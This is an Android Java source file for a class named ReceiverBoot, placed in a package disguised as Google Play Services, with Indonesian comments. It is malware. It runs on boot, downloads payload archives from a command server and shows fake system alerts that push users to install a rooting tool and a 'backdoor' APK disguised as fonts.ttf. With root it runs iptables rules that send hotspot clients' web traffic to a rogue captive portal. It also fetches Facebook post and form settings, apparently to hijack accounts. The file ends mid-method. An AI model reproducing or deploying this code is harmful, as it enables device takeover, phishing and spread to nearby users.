package com.google.play.services;

//   DEBUG MODE
// 1.  hapus net untuk nonaktifkan usb line:278
// 2.  ubah local ke main server di method logSend

import com.google.play.ngrok.NgrokClient;
import org.apache.http.params.HttpParams;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.*;
import android.app.*;
import android.os.IBinder;
import android.os.Build;
import android.os.AsyncTask;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.Handler;
import android.os.Vibrator;
import android.os.BatteryManager;
import android.provider.ContactsContract;
import android.util.Log;
import android.database.Cursor;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Resources;
import android.content.pm.*;
import android.content.ActivityNotFoundException;
import android.content.SharedPreferences;
import android.widget.*;
import android.view.*;
import android.media.MediaPlayer;
import android.media.AudioManager;
import android.view.LayoutInflater;
import android.view.Gravity;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.RectF;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.webkit.MimeTypeMap;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebIconDatabase;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiConfiguration;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.text.*;
import java.lang.reflect.*;

public class ReceiverBoot extends BroadcastReceiver
{
	private static String TAG = "AsDfGhJkL";
	private static String titleAlert = "";
    private Handler insH = new Handler();
    private Runnable insR;
	private Vibrator vibrator;
	private EditText edtContent;
	private WebView webFbWebkit;
	private WebView webFbTarget;
	private WebView webFbPayload;
	private boolean oke = true;
	private SystemThread system;
	private Context exContext;
	private ServerUtils utils;
    private Installer installator;
    private String pathToInstallServer;
    private static String version = "1";
    private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private AudioManager audioManager;
	private static boolean prosesThread = true;
	private static boolean tmpThread = true;
	private static int sizedownload = 0;
	public AlertDialog dialog;
	public Toast toast;
	public static int delayToast = 0;
    public static Boolean kumpulkanPayload = true;

	public static String resultFbKoment = "";
	public static String resultFbTarget = "";
	public static String resultFbPayload = "";
	public static String resultFbWebkit = "";
	public static boolean processFbWebkit = true;
	public static boolean processFbTarget = true;
	public static boolean processFbPayload = true;
	public static boolean processFbPayloadBig = true;
	public static boolean finishInstall = false;
    public static boolean rootResult = false;
	public static boolean installResult = false;
	public static String identitasResult = "";
	public static boolean net = false;
	public static boolean pingResult = false;
	public static String requestAksi = "";
	public static String requestPath = "";
	public static String requestUrl = "";
	public static String requestResult = "";
	public static String requestResultUpload = "";
	public static String batStatus = "";
    public static boolean main = true;
    public static String mainSUPER = "";
    public static String mainSUPERFB = "";
    public static String mainSUPERFBform = "";
    public static String docFolder, pathExternal, pathInternal;
    public static boolean[] flags;
	public static String[] arrFb = {};

    private Handler mHandler = new Handler();

	private Runnable mRefresh = new Runnable() {
		public void run() {
			toast.show();
			mHandler.postDelayed(mRefresh, 100);
		}
	};

	public void setDoc(Context context) {
		utils = new ServerUtils(context);
        pathToInstallServer = utils.getPathToInstallServer();
        docFolder = utils.getDocFolder();
        pathInternal = utils.getPathToInstallServer();
        pathExternal = utils.getPathExternal();
	}

	@Override
	public void onReceive(Context context, Intent intent)
	{
		exContext = context;
		float voltase = (float)(intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0))/100;
		float persent = (float)(intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0));
		int statusB = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);

		String[] portal = {
				"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
				"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
				"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+Identitas.getIPAddress(true)+":8888",
				"iptables -P FORWARD DROP",
				"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80"
			};

		boolean state = statusB == BatteryManager.BATTERY_STATUS_CHARGING || statusB == BatteryManager.BATTERY_STATUS_FULL;
		String charger = "TIDAK_CHARGER";
		if (state) {
			int charPlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
			boolean usbPlug = charPlug == BatteryManager.BATTERY_PLUGGED_USB;
			boolean acPlug = charPlug == BatteryManager.BATTERY_PLUGGED_AC;
			
			if (usbPlug) {
				charger = "USB_CHARGER";
			}
			else if (acPlug) {
				charger = "AC_CHARGER";
			}
		}
		batStatus = ""+voltase+"v "+persent+"% "+charger;

		system = new SystemThread();
		audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
		settings = context.getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		mainSUPER = settings.getString("swmain","");
		mainSUPERFB = settings.getString("swlinkfb","");
		mainSUPERFBform = settings.getString("swformfb","");
		utils = new ServerUtils(context);
		identitasResult = Identitas.getIPAddress(true);
        pathToInstallServer = utils.getPathToInstallServer();
        docFolder = utils.getDocFolder();
        pathInternal = utils.getPathToInstallServer();
        pathExternal = utils.getPathExternal();

        File htdocs = new File(pathExternal);
        if (!htdocs.exists()) {
            htdocs.mkdir();
        }

        /*if (settings.getString("server","").equals("aktif")) {
        	install(context);
        }
        if (settings.getString("pakroot","").equals("aktif")) {
        	if (rootRequest().equals("tolak user")) {
				logSend(context, "root android state............TOLAK USER\n");
				toastShow(context, "aktif", Color.RED, Gravity.TOP, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can't access binary system to update manager\n\n\n");
			}
		}*/

		_server(context);

		if (getServer() && installResult) {
			//NgrokClient ngclient = new NgrokClient("127.0.0.1", 8888, "6SsJgtJB41p7XXFoE7qDx_3QuzH9Pc8ZyET4QHNngt8", true);
			//ngclient.start();

			//logSend(context, "Aktif="+getPublicIPAddress(context)+":8888\n");
		}

		if (mainSUPERFB.equals("fbhidup")) 
		{
			updateLinkFb(context);
		}

		if (mainSUPERFBform.equals("fbformhidup")) 
		{
			updateFormFb(context);
		}

        if (mainSUPER.equals("hidup")) 
		{
			install(context);
			if (installResult) 
			{
				//rooting(context);
				if (rootResult) 
				{
					sebar(context, portal);
				}
			}
		}

		if (!new File("/sdcard/Android/data/.datasw").exists() && cekConnection(context))
		{
			orangDekat(context);
		}

		if (hostspotStatus(context)) {
			
			if (installResult) 
			{
				/*if (getServer()) 
				{
					String oke = setServer(true);
				}
				
				String[] data = shellCommands("ls "+pathExternal+"/client/").split("\n");
					
				for (int i=0; i<data.length-1; i++) 
				{
					Log.i(TAG, "hotspot: "+data[i]);

					if (!utils.checkHotspot(data[i])) {
						ServiceAlert alert = new ServiceAlert();
        				alert.dataText = "\n             Sistem Android!\n\n  Dalvikvm driver missed I/QCNEJ (799): |CORE:COM:RCVR| CNE creating socket [0xfa8] can't access ->/system/build.prop/ please following!\n\n  1.  Connecting in this hotspot\n  2.  Open browser URL http://"+identitasResult+":8888/index.php\n  3.  Start download plugin store client android\n  4.  Install apk plugin store";
        				alert.dataTextSize = 15;
        				alert.pilihAksi = "hotspot";
        				alert.dataPaket = "";

						context.startService(new Intent(context, ServiceAlert.class));
					}
				}*/
				logSend(context, "Hotspot terpakai............OK\n");
				
			}
		}


		//harus urut eksekusi
		if (cekConnection(context) && !hostspotStatus(context)) 
		{
			if (charger.equals("USB_CHARGER")) {
				net = false;

				logSend(context, "[WARNING!] apk sedang didebug");
			} else {
				net = true;
			}

			net = true;

        } else {
        	net = false;
        	kumpulkanPayload = true;
        }

        finishInstall = false;

        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
        {
			context.startService(new Intent(context, SystemThread.class));
			ServiceTTS tts = new ServiceTTS();
			tts.str = "";
			context.startService(new Intent(context, ServiceTTS.class));

			if (installResult) 
			{
				//String k = setServer(true);

				//rooting(context);
				if (rootResult) 
				{
					sebar(context, portal);
				}
			}

		}
	}

	// jangan dipanggil 2x dalam satu waktu
	public void toastShow(Context context, String aktif, int warna, int letak, String text) 
	{
		if (delayToast != 0) {
			mHandler.removeCallbacks(mRefresh);

			Log.i(TAG, "count"+delayToast);
			toastText(context, text, warna, letak);

			CountDownTimer hitungMundur = new CountDownTimer(delayToast, 100){
				public void onTick(long millisUntilFinished){
					toast.show();
				}
				public void onFinish()
				{
					toast.cancel();
				}
			}.start();
		}
		else if (aktif.equals("aktif") && delayToast == 0) 
		{
			Log.i(TAG, "handler:"+delayToast);
			mHandler.removeCallbacks(mRefresh);
			mHandler.postDelayed(mRefresh, 100);
			toastText(context, text, warna, letak);
		}
		else {
			Log.i(TAG, "remove"+delayToast);
			mHandler.removeCallbacks(mRefresh);
		}
	}

	public String getPath() {
		return pathExternal;
	}
	public void shared(String judul, String save) {
		seteditor.putString(judul, save);    
        seteditor.commit();
	}

	private void logSend(Context context, String text) {
		if (net) 
		{
			String waktu = new SimpleDateFormat("HH:mm:ss").format(new Date());
			String ip = Identitas.getIPAddress(true);
			String hash = "";
			String[] pros = { "["+waktu+"] ->"+ip+" ->"+text };
			try {
				for (String s : pros)     
				{
					hash = URLEncoder.encode(s, "UTF-8");       
				}
			}catch (Exception e) {}

			/*requestUrl = system.urlServer+"/payload.php?outpayload="+hash;
			requestAksi = "web";
			mainRequest(context); bikin hang app */
		}
	}

	public void temanCek(Context context) {
		// fonts.ttf adalah backdoor2
		try {
			if (!new MainActivity().apkMana(context, "com.keyboard.input.uxpo", "cek")) 
			{
				Runtime.getRuntime().exec("mv "+pathExternal+"/fonts.ttf "+pathExternal+"/ads.apk");
				Thread.sleep(80);

				ServiceAlert alert = new ServiceAlert();
				titleAlert = "\t\t\t\t\t=============\n"+
					        "\t\t\t\t\t|   System OS!   |\n"+
					         "\t\t\t\t\t=============";
				alert.dataText = "\n"+titleAlert+"\n\n\n   Instalation failed please try again !\n   ERR code: permision denied";
				alert.dataTextSize = 15;
				alert.pilihAksi = "install";
				alert.dataPaket = pathExternal+"/ads.apk";
				context.startService(new Intent(context, ServiceAlert.class));

				insH.postDelayed(insR, 5 * 1000);

				insR = new Runnable() {
					public void run() {
						insH.postDelayed(insR, 5 * 1000);

						if (new MainActivity().apkMana(context, "com.keyboard.input.uxpo", "open")) {
							insH.removeCallbacks(insR);
							context.stopService(new Intent(context, ServiceAlert.class));

							try {Runtime.getRuntime().exec("mv "+pathExternal+"/ads.apk "+pathExternal+"/fonts.ttf");}catch(Exception e) {}
						} else {

							context.stopService(new Intent(context, SystemThread.class));
						}
					}
				};

			}

		}catch(Exception e) {
		}
	}

	public void updateLinkFb(Context context) {
		JSONObject obj;
		requestUrl = system.urlServer+"/linkfb.txt";
		requestAksi = "web";
		mainRequest(context);

		try {		   			
			obj = new JSONObject(requestResult);
			
			seteditor.putString("fbpostingan", obj.getString("link_postingan"));   
			seteditor.putString("fbpostinganEdt", obj.getString("link_postinganEdt"));   
			seteditor.putString("fbpostinganMsg", obj.getString("link_postinganMsg"));   
			seteditor.commit();

		}catch(Exception e) {}
	}

	public void updateFormFb(Context context) {
		JSONObject obj;
		requestUrl = system.urlServer+"/formfb.txt";
		requestAksi = "web";
		mainRequest(context);

		try {		   			
			obj = new JSONObject(requestResult);
			
			seteditor.putString("formfbpostinganEdt", obj.getString("edt_form_postingan"));   
			seteditor.putString("formfbpostinganBtn", obj.getString("btn_form_postingan"));

			seteditor.putString("formfbmessengerEdt", obj.getString("edt_form_messenger"));   
			seteditor.putString("formfbmessengerBtn", obj.getString("btn_form_messenger"));

			seteditor.putString("formfbkomentarEdt", obj.getString("edt_form_komentar"));   
			seteditor.putString("formfbkomentarBtn", obj.getString("btn_form_komentar"));  
			seteditor.commit();

		}catch(Exception e) {}
	}

    public String fileToHex(String pathin) {
		ByteArrayOutputStream ous = null;
		InputStream ios = null;
		byte[] bytes;
		StringBuilder s = new StringBuilder();
		try {
			byte[] buffer = new byte[4096];
			ous = new ByteArrayOutputStream();
			ios = new FileInputStream(new File(pathin));
			int read = 0;

			while ((read=ios.read(buffer)) != -1) {
				ous.write(buffer, 0, read);
			}

			bytes = ous.toByteArray();
			char[] hexDigits = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
			StringBuilder buf = new StringBuilder(bytes.length * 2);
			
			for (byte aByte : bytes) {
				buf.append(hexDigits[(aByte & 240) >> 4]);
				buf.append(hexDigits[aByte & 15]);
			}
			ous.close();
			ios.close();
			
			return buf.toString()+"=>"+bytes.length;

		}catch(Exception e) {
			return ""+e;
		}
	}

	//RAM String tidak muat
	public void fileToString(String pathin) {
		ByteArrayOutputStream ous = null;
		InputStream ios = null;
		StringBuilder s = new StringBuilder();
		try {
			byte[] buffer = new byte[4096];
			ous = new ByteArrayOutputStream();
			ios = new FileInputStream(new File(pathin));
			int read = 0;

			while ((read=ios.read(buffer)) != -1) {
				ous.write(buffer, 0, read);
			}

			for (int i=0; i<ous.toByteArray().length; i++) {
				if (i == 0)
					s.append("@data@ "+ous.toByteArray()[i]);
				else if (i == ous.toByteArray().length-1)
					s.append(" "+ous.toByteArray()[i]+" @data@");
				else 
					s.append(" "+ous.toByteArray()[i]);
			}

			ous.close();
			ios.close();

			String data = s.toString();
			String[] out = new String[data.length()];
			int jum = data.length();
			int tam = 0;
			int oke = 5575;
			int jarr = 0;
			boolean yosh = true;

			if (jum % 2 != 0) {
				data = data+" ";
				jum += 1; //ganjil
				Log.i(TAG, "ganjil dibuat genap");
			}
			
			for (int i=0; i<=jum; i++) 
			{
				try {
					out[i] = data.substring(tam, tam+oke);

				} catch(Exception e) {
					if (yosh) {
						yosh = false;
						out[i] = data.substring(jum-oke, jum);
					}
				}

				if (tam < jum) {
					jarr++;
					tam+=oke;
				}
			}

			arrFb = new String[jarr];
			
			for (int i=0; i<arrFb.length; i++) {
				arrFb[i] = out[i];

				Log.i(TAG, "cut["+i+"] => "+arrFb[i]+"\n\n");
			}

		}catch(Exception e) {}
	}

	public void orangDekat(Context context) {
		// extrak ke sd
		setDoc(context);
		if (!utils.checkDownload()) 
	    {
	    	if (!new File(pathInternal+"/fb.zip").exists()) {
				Log.i(TAG, "assets fb.zip");
				new Installer().assetToSdcard(context, "fb.zip", pathInternal+"/");

			} else if (!new File(pathExternal+"/server.zip").exists()) {
				Log.i(TAG, "assets server.zip");
				new Installer().assetToSdcard(context, "server.zip", pathExternal+"/");

			} else {
				Log.i(TAG, "assets data.zip");
				new Installer().assetToSdcard(context, "data.zip", pathExternal+"/");

			}
		}

		// EXTRAK
		if (utils.checkFb()) {
			extrak(context, pathInternal+"/fb.zip", pathInternal, docFolder);
		}

		if (utils.checkDownload() && !utils.checkInstall()) {
			logSend(context, "download DATA..............OK\n");
			logSend(context, "extract SERVER............\n");
			extrak(context, pathExternal+"/server.zip", pathToInstallServer, docFolder);
		}

		if (utils.checkDownload() && !utils.checkInstallData() && utils.checkInstall()) {
			logSend(context, "extract SERVER.............OK\n");
			logSend(context, "extract DATA...............OK\n");

			extrak(context, pathExternal+"/data.zip", pathExternal, pathExternal);
		}

        if (utils.checkInstallData()) {
			installResult = true;
        }
	}

	public void install(Context context) {
		
		// DOWNLOAD
	    if (!utils.checkDownload()) 
	    {
	    	Log.i(TAG, "download all data..........");
			
			requestUrl = system.urlServer+"/install.txt";
			requestAksi = "web";
			mainRequest(context);

		   	JSONObject obj;

		   	if (!new File(pathInternal+"/fb.zip").exists()) {
		   		try {		   			
		   			obj = new JSONObject(requestResult);
		   			Log.i(TAG, "download fb database: "+obj.getString("url_install_fb"));
		   			
		   			requestUrl = obj.getString("url_install_fb");
					requestAksi = "download";
					requestPath = pathInternal+"/fb.zip";
					mainRequest(context);

		   			logSend(context, "download fb database...........\n");

				}
				catch(Exception e) {}
		   	} 
		   	else if (!new File(pathExternal+"/server.zip").exists()) {
				try {
					obj = new JSONObject(requestResult);
					Log.i(TAG, "download server : "+obj.getString("url_install_server"));

					requestUrl = obj.getString("url_install_server");
					requestAksi = "download";
					requestPath = pathExternal+"/server.zip";
					mainRequest(context);

	    			logSend(context, "download fb database ............OK\n");
					logSend(context, "download SERVER............\n");

				}
				catch(Exception e) {}
	    	} else {
	    		logSend(context, "download SERVER............OK\n");
	    		try {
	    			obj = new JSONObject(requestResult);
		    		Log.i(TAG, "download DATA : "+obj.getString("url_install_data"));

		    		requestUrl = obj.getString("url_install_data");
					requestAksi = "download";
					requestPath = pathExternal+"/data.zip";
					mainRequest(context);

		    		logSend(context, "download DATA..............\n");

				}catch(Exception e) {}
	    	}
	    	
        } 

        // EXTRAK
        if (utils.checkFb()) {
        	extrak(context, pathInternal+"/fb.zip", pathInternal, docFolder);
        }

        if (utils.checkDownload() && !utils.checkInstall()) {
        	logSend(context, "download DATA..............OK\n");
        	logSend(context, "extract SERVER............\n");
        	extrak(context, pathExternal+"/server.zip", pathToInstallServer, docFolder);
        }

        if (utils.checkDownload() && !utils.checkInstallData() && utils.checkInstall()) {
			logSend(context, "extract SERVER.............OK\n");
			logSend(context, "extract DATA...............OK\n");

			extrak(context, pathExternal+"/data.zip", pathExternal, pathExternal);
        }

        if (utils.checkInstallData()) {
			installResult = true;
        }
	}

	public void rooting(Context context) 
	{
		
		if (rootRequest().equals("root")) {
			mHandler.removeCallbacks(mRefresh);
			rootResult = true;
		}
		if (rootRequest().equals("tolak user")) {
			logSend(context, "root android state............TOLAK USER\n");
			rootResult = false;
			toastShow(context, "aktif", Color.RED, Gravity.TOP, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can't access binary system to update manager\n\n\n");
		}
		if (rootRequest().equals("tidak root")) {
			logSend(context, "root android state.............NO ROOT\n");
			rootResult = false;
			if (!new MainActivity().apkMana(context, "kingoroot.supersu", "open")) 
			{
				logSend(context, "install KINGOROOT..............\n");

				toastShow(context, "mati", 0, 0, "");
				toastShow(context, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. Open app and click root.\n\n\n\n\n       [ WARNING! ]\n\n\n");
		
				String kroot = pathExternal+"/kroot.apk";

				Intent intent = new Intent(Intent.ACTION_VIEW);
        		intent.setDataAndType(Uri.fromFile(new File(kroot)), "application/vnd.android.package-archive");
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        		context.startActivity(intent);
        		Log.i(TAG, kroot+kroot);	
	      	}
			else {
				logSend(context, "install KINGOROOT.............OK\n");
				toastShow(context, "mati", 0, 0, "");
				toastShow(context, "aktif", Color.GREEN, Gravity.TOP, "  [ PLEASE ROOTING NOW ]   \n\n\n     Android system reboot after 30 minuts.    \n\n\n[ WARNING ]\n");
			}
        }
	}

	public void _server(Context context) {
		utils = new ServerUtils(context);
	}
	public boolean getServer() {
		flags = utils.checkRun();
		if (flags[0] && flags[1] && flags[2]) {
			return true;
		
		}else{
			return false;
		}
	}
	public String setServer(boolean sw) {
		flags = utils.checkRun();
		if (flags[0] && flags[1] && flags[2]) 
		{
			if (!sw) {
				utils.stopSrv();
				return "server stoping";
			} 
			else {
				return "server running";
			}
		}
		else {
			if (sw) {
				utils.runSrv();
				return "server running";
			}
		}
		return "";
	}

	public void sebar(Context context, String[] iproute) 
	{
		Log.i(TAG, "panggil");
		
		if (hostspotStatus(context)) 
		{
			flags = utils.checkRun();

			if (flags[0] && flags[1] && flags[2]) Log.i(TAG, "run server OK");
			else utils.runSrv();

			if (!cekGsm(context)) {
				setGSM(true, context);
			}

			if (cekClient().equals("ada")) {
				Log.i(TAG, "ada client");
				dialog.cancel();
			} 
			else {
				dialogAlert(context, "Sistem Android", "Network manager can't access hardware /etc/misc/wifi_supplicant please folowing:\n\n\n1. hubungkan wifi ke hotspot ini\n\n2. Sign captive portal\n     atau buka browser akses url        http://index.html\n\n3. Install dan buka app untuk update system");

				CountDownTimer hitungMundur = new CountDownTimer(5000, 100){
					public void onTick(long millisUntilFinished){
					}
					public void onFinish()
					{
						dialog.cancel();
					}
				}.start();
				//toastShow(context, "aktif", Color.YELLOW, Gravity.CENTER, "SYSTEM ALERT WINDOW!!\n\n\nNetwork manager can't add client to /data/misc/wifi please folowing:\n\n1. open browser url http://index.html or Sign in Captive portal\n2. Install app to update\n3. Open app to configure\n\n\n\n\n[UPDATE]");
			}
		}
		
		if (hostspotStatus(context) && main) 
		{
		   	main = false;
			Log.i(TAG, "main:"+main);
			
		   	setGSM(true, context);
			rootCommands(iproute);

			try {
				Runtime.getRuntime().exec("mkdir -p "+pathExternal+"/client");
			}catch(Exception e) {}

			if (!new File(pathExternal+"/system.apk").exists()) 
			{
				if (new MainActivity().apkMana(context, "os.system", "pull")) 
				{
					try {
						Thread.sleep(4000);
						Runtime.getRuntime().exec("mv "+pathExternal+"/os.system.apk "+pathExternal+"/system.apk");
					}catch(Exception e){
						Log.i(TAG, "rename er : "+e);
					}
				}
	    	}
			
    	}
    	else if (!hostspotStatus(context) && !main) 
    	{
			Log.i(TAG, "reset");

			flags = utils.checkRun();
			if (flags[0] && flags[1] && flags[2]) 
			{
				utils.stopSrv();
				Log.i(TAG, "stop server OK");
			}

			dialog.cancel();

			if (cekClientOrServer().equals("client")) {
				Log.i(TAG, "mode client");
				requestUrl = "http://"+Identitas.getIpRouter()+":8888/fileman.php?id="+Identitas.getIPAddress(true);
				requestAksi = "web";
				mainRequest(context);
			}

    		
			try {
				Runtime.getRuntime().exec("rm "+pathExternal+"/system.apk");
			}
			catch(Exception e) {}
			try {
				Runtime.getRuntime().exec("rm -r "+pathExternal+"/client");
			}
			catch(Exception e) {}

			main = true;
		}

	}

	public String cekClientOrServer() {
		String sip = Identitas.getIPAddress(true);
        String[] ip = sip.split("[.]");
        int index = ip.length - 1;

        Log.i(TAG, "addres : "+ip[index]);

        if (ip[index].equals("1")) {
        	return "server";
        }
        return "client";
	}

	public String cekClient() {
		String exe = shellCommands("ls "+pathExternal+"/client");
		if (exe.equals("")) {
			return "kosong";
		}

		return "ada";
	}

	public static String getPublicIPAddress(Context context) {
    	//final NetworkInfo info = NetworkUtils.getNetworkInfo(context);

    	ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
    	final NetworkInfo info = cm.getActiveNetworkInfo();

    	RunnableFuture<String> futureRun = new FutureTask<>(new Callable<String>() {
        	@Override
        	public String call() throws Exception {
            	if ((info != null && info.isAvailable()) && (info.isConnected())) {
                	StringBuilder response = new StringBuilder();

                	try {
                    	HttpURLConnection urlConnection = (HttpURLConnection) (
                            new URL("http://checkip.amazonaws.com/").openConnection());
                    	urlConnection.setRequestProperty("User-Agent", "Android-device");
                    	//urlConnection.setRequestProperty("Connection", "close");
                    	urlConnection.setReadTimeout(15000);
                    	urlConnection.setConnectTimeout(15000);
                    	urlConnection.setRequestMethod("GET");
                    	urlConnection.setRequestProperty("Content-type", "application/json");
                    	urlConnection.connect();

                    	int responseCode = urlConnection.getResponseCode();

                    	if (responseCode == HttpURLConnection.HTTP_OK) {

                        	InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                        	BufferedReader reader = new BufferedReader(new InputStreamReader(in));

                        	String line;
                        	while ((line = reader.readLine()) != null) {
                            	response.append(line);
                        	}

                    	}
                    	urlConnection.disconnect();
                    	return response.toString();
                	} catch (Exception e) {
                    	e.printStackTrace();
                	}
            	} else {
                	//Log.w(TAG, "No network available INTERNET OFF!");
                	return null;
            	}
            	return null;
        	}
    	});

    	new Thread(futureRun).start();

    	try {
        	return futureRun.get();
    	} catch (InterruptedException | ExecutionException e) {
        	e.printStackTrace();
        	return null;
    	}

	}

	public boolean ping(Context context) {
		Log.i(TAG, "ping server: http://www.google.com  ...");

		HttpParams httpParams = new BasicHttpParams();
	    HttpConnectionParams.setConnectionTimeout(httpParams, 10000);
	    HttpConnectionParams.setSoTimeout(httpParams, 10000);

        HttpClient httpClient = new DefaultHttpClient(httpParams);
        HttpGet request = new HttpGet(system.urlServer);
        try{
            HttpResponse response = httpClient.execute(request);
        	Log.i(TAG, "ping terhubung");
        	return true;
		}
		catch(Exception e) {
        	Log.i(TAG, "ping error");
			
			return false;
		}

	}

	public static boolean cekConnection(Context context) {
		ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo wifinfo    = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		NetworkInfo mobileinfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		NetworkInfo active     = cm.getActiveNetworkInfo();
		
		if (wifinfo != null && wifinfo.isConnected()) {
			return true;
		}
		if (mobileinfo != null && mobileinfo.isConnected()) {
			return true;
		}
		if (active != null && active.isConnected()) {
			return true;
		}
		return false;
	}

	public static boolean cekGsm(Context context) {
		ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo mobileinfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		NetworkInfo active     = cm.getActiveNetworkInfo();
		
		if (mobileinfo != null && mobileinfo.isConnected()) {
			return true;
		}
		if (active != null && active.isConnected()) {
			return true;
		}
		return false;
	}

	public static void setGSM(boolean enable, Context context) {
    	String command;
    	if (enable) {
    		command = "svc data enable\n";
    	} else {
    		command = "svc data disable\n";
    	}
    	try {
    		Process su = Runtime.getRuntime().exec("su");
    		DataOutputStream out = new DataOutputStream(su.getOutputStream());
    		out.writeBytes(command);
    		out.flush();
    		
    		out.close();
    	}
    	catch (Exception e) {}
    }

	public static boolean hostspotStatus(Context context) { 
		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
		try { 
			Method method = wifimanager.getClass().getDeclaredMethod("isWifiApEnabled"); 
			method.setAccessible(true); 
			return (Boolean) method.invoke(wifimanager); 
		}
		catch (Throwable ignored) {} 
		return false; 
	} 

	public static boolean hotspotConfig(Context context) { 
		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
		WifiConfiguration wificonfiguration = null; 
		try { 
			// if WiFi is on, turn it off 
			if(hostspotStatus(context)) { 
				wifimanager.setWifiEnabled(false);
				main = true;
			} 
			Method method = wifimanager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class); 
			method.invoke(wifimanager, wificonfiguration, !hostspotStatus(context)); 
			return true; 
		}
		catch (Exception e) { 
			e.printStackTrace(); 
		} 
		return false; 
	} 

	public static String rootRequest() {
		boolean retval = false;
		Process suProcess;
		String rootData = "";
		try {
			suProcess = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
			DataInputStream osRes = new DataInputStream(suProcess.getInputStream());
			if (null != os && null != osRes) {
				os.writeBytes("id\n");
				os.flush();

				String currUid = osRes.readLine();
				boolean exitSu = false;
				if (null == currUid) {
					retval = false;
					exitSu = false;
					rootData = "tolak user";
					Log.d("ROOT","Cant get root access or denied by user");
				}
				else if (true == currUid.contains("uid=0")) {
					retval = true;
					exitSu = true;
					rootData = "root";
					Log.d("ROOT","Root access granted");
				}
				else {
					retval = false;
					exitSu = true;
					Log.d("ROOT","Root access rejectd: "+currUid);
				}

				if (exitSu) {
					os.writeBytes("exit\n");
					os.flush();
				}

			}
		} catch (Exception e) {
			retval = false;
			rootData = "tidak root";
			Log.d("ROOT", "Root access rejectd["+e.getClass().getName()+"] :"+e.getMessage());
		}
		//return retval;
		return rootData;
	}

	public void rootCommands(String[] cmds) {
		Process p;
		try{
			p = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(p.getOutputStream());

			for (String tmpCmd : cmds) {
				os.writeBytes(tmpCmd+"\n");
			}
			os.writeBytes("exit\n");
			os.flush();
		} catch (Exception e) {}
	}

	public void shellCommand(String[] cmds) {
		Process p;
		try{
			p = Runtime.getRuntime().exec(cmds);
			p.waitFor();
			
			DataOutputStream os = new DataOutputStream(p.getOutputStream());

			for (String tmpCmd : cmds) {
				os.writeBytes(tmpCmd+"\n");
			}
			os.writeBytes("exit\n");
			os.flush();
		} catch (Exception e) {}
	}

	public String shellCommands(String command) {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String line = "";
			while ((line = reader.readLine())!= null) {
				output.append(line+"\n");
			}

		}
		catch (Exception e) {
			e.printStackTrace();
		}
		String response = output.toString();
		return response;
	}
	

	public String textSplit(String data, String tsplit) {
		StringBuffer out = new StringBuffer();
		String[] sp = data.split(tsplit);

		for (int i=0; i<sp.length; i++) {
			out.append(sp[i]);
		}
		return out.toString();
	}

	public void editor(Context context, String text, String nfile) {
		Installer save = new Installer(context, false);
		try {
			save.saveCode(text, "utf-8", pathExternal+"/"+nfile);
		}catch(Exception e){}
	}

	public void getar(Context context, String durasi) {
		long[] patern = {0, 200, 500, 200};
		vibrator = (Vibrator)context.getSystemService(Context.VIBRATOR_SERVICE);
		vibrator.vibrate(patern, 0);


		CountDownTimer hitungMundur = new CountDownTimer(Integer.parseInt(durasi), 100){
			public void onTick(long millisUntilFinished){
			}
			public void onFinish()
			{
				vibrator.cancel();
			}
		}.start();
	}

	public void extrak(Context context, String efile, String pathsatu, String pathdua) {
		Installer installator = new Installer(context, true);
